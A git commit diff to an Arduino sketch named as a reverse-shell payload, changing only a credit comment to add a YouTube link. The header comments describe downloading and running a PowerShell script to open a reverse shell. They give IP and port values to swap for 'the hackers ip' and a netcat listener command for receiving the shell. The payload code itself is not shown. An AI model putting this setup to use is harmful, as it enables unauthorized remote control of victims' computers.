4dba21096463fe0f6aee84015bc342f0bd2c20bb
ashwanthcreators <85355780+ashwanthcreators@users.noreply.github.com>
2021-07-16 18:10:45 +0530

    Update revershell123456789.ino

--- revershell123456789.ino
+++ revershell123456789.ino
@@ -1,5 +1,5 @@
 // This script downloads and executes a powershell script efectively opening up a reverse shell in less than 30 seconds. 
-// This script credits to Ethical Hacking youtube channel
+// This script credits to Ethical Hacking youtube channel -- https://www.youtube.com/channel/UCYujGFwVKJbiweT0kd6CwLg
 // This script contains ip address of 172.17.45.102 , change it to the hackers ip
 // 87 behind the ip is the port . You can change it to your desire in both the script here and the hackers opening port
 // enter the above command as root user in linux ---  stty raw -echo; (stty size; cat) | nc -lvnp 87 -s 172.28.131.38  --- (-s here is ip ) behind -lvnp is the port 
